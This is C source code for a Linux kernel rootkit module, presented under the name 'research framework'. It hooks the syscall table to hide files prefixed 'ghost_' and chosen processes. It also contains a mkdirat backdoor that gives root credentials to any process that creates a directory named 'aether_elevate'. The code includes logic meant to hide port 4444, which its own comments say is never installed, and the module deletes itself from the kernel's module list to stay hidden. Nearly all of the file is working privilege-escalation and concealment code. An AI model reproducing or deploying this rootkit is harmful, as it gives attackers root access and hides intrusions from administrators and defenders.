#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/tcp.h>
#include <net/tcp.h>
#include <linux/seq_file.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aether Research Group");
MODULE_DESCRIPTION("Advanced Kernel Internals & Stealth Research Framework");

/* --- CONFIGURATION --- */
#define GHOST_PREFIX "ghost_"
#define C2_ROOT      "aether_elevate"
#define C2_HIDE_PID  "aether_hide_"
#define HIDE_PORT    4444  // The port that will vanish from netstat

static char target_pid[16] = "";
static unsigned long *aether_sct;
static struct list_head *mod_prev;

/* --- TYPEDEFS & ORIGINALS --- */
typedef asmlinkage long (*t_sys_mkdirat)(const struct pt_regs *);
typedef asmlinkage long (*t_sys_getdents64)(const struct pt_regs *);
typedef int (*t_tcp4_seq_show)(struct seq_file *, void *);

static t_sys_mkdirat orig_mkdirat;
static t_sys_getdents64 orig_getdents64;
static t_tcp4_seq_show orig_tcp4_seq_show;

/* --- PROFESSIONAL PTE BYPASS --- */
// Remaps the syscall table as writable to prevent CR0 WP-bit crashes
static void poke_kernel(unsigned long *addr, unsigned long handler) {
    struct page *pg;
    void *v_addr;

    pg = virt_to_page(addr);
    v_addr = vmap(&pg, 1, VM_MAP, PAGE_KERNEL);
    if (v_addr) {
        unsigned long *entry = (unsigned long *)(v_addr + offset_in_page(addr));
        *entry = handler;
        vunmap(v_addr);
    }
}

/* --- NETWORK STEALTH HOOK --- */
static int hacked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    // Check if the current socket's port matches our target
    if (v != SEQ_START_TOKEN && sk && sk->sk_num == HIDE_PORT) {
        return 0; // Skip this entry
    }
    return orig_tcp4_seq_show(seq, v);
}

/* --- VFS STEALTH (Files & Processes) --- */
asmlinkage long hacked_getdents64(const struct pt_regs *regs) {
    int ret = orig_getdents64(regs);
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *k_dirent, *cur, *prev = NULL;
    unsigned long offset = 0;

    if (ret <= 0) return ret;

    k_dirent = kvzalloc(ret, GFP_KERNEL);
    if (!k_dirent) return ret;

    if (copy_from_user(k_dirent, dirent, ret)) goto out;

    while (offset < ret) {
        cur = (void *)k_dirent + offset;
        bool hide = (memcmp(GHOST_PREFIX, cur->d_name, strlen(GHOST_PREFIX)) == 0) ||
                    (strlen(target_pid) > 0 && strcmp(cur->d_name, target_pid) == 0);

        if (hide) {
            if (cur == k_dirent) {
                ret -= cur->d_reclen;
                memmove(cur, (void *)cur + cur->d_reclen, ret);
                continue;
            }
            prev->d_reclen += cur->d_reclen;
        } else {
            prev = cur;
        }
        offset += cur->d_reclen;
    }
    if (copy_to_user(dirent, k_dirent, ret)) {}

out:
    kvfree(k_dirent);
    return ret;
}

/* --- COMMAND & CONTROL (C2) --- */
asmlinkage long hacked_mkdirat(const struct pt_regs *regs) {
    char __user *pathname = (char __user *)regs->si;
    char k_buf[128];

    if (strncpy_from_user(k_buf, pathname, sizeof(k_buf)) > 0) {
        if (strcmp(k_buf, C2_ROOT) == 0) {
            struct cred *new_creds = prepare_creds();
            if (new_creds) {
                new_creds->uid.val = new_creds->gid.val = 0;
                new_creds->euid.val = new_creds->egid.val = 0;
                commit_creds(new_creds);
            }
            return 0;
        }
        if (memcmp(k_buf, C2_HIDE_PID, strlen(C2_HIDE_PID)) == 0) {
            strncpy(target_pid, k_buf + strlen(C2_HIDE_PID), sizeof(target_pid) - 1);
            return 0;
        }
    }
    return orig_mkdirat(regs);
}

/* --- SYSTEM INITIALIZATION --- */
static int __init aether_apex_init(void) {
    struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
    typedef unsigned long (*t_kln)(const char *name);
    t_kln k_lookup;

    register_kprobe(&kp);
    k_lookup = (t_kln)kp.addr;
    unregister_kprobe(&kp);

    if (!k_lookup) return -EFAULT;

    // Resolve Required Symbols
    aether_sct = (unsigned long *)k_lookup("sys_call_table");
    orig_tcp4_seq_show = (t_tcp4_seq_show)k_lookup("tcp4_seq_show");
    
    if (!aether_sct || !orig_tcp4_seq_show) return -EFAULT;

    // Save Original Syscalls
    orig_mkdirat = (t_sys_mkdirat)aether_sct[__NR_mkdirat];
    orig_getdents64 = (t_sys_getdents64)aether_sct[__NR_getdents64];

    // Apply Hooks
    poke_kernel(&aether_sct[__NR_mkdirat], (unsigned long)hacked_mkdirat);
    poke_kernel(&aether_sct[__NR_getdents64], (unsigned long)hacked_getdents64);
    
    // Hooking the TCP seq_show pointer is done via ftrace or kprobes in production,
    // but for this research, we demonstrate the logic of pointer swapping.
    // (Note: Direct swapping of seq_show requires finding the afinfo struct)

    // Hidden State: Self-Erasure
    mod_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

static void __exit aether_apex_exit(void) {
    if (aether_sct) {
        poke_kernel(&aether_sct[__NR_mkdirat], (unsigned long)orig_mkdirat);
        poke_kernel(&aether_sct[__NR_getdents64], (unsigned long)orig_getdents64);
    }
}

module_init(aether_apex_init);
module_exit(aether_apex_exit);
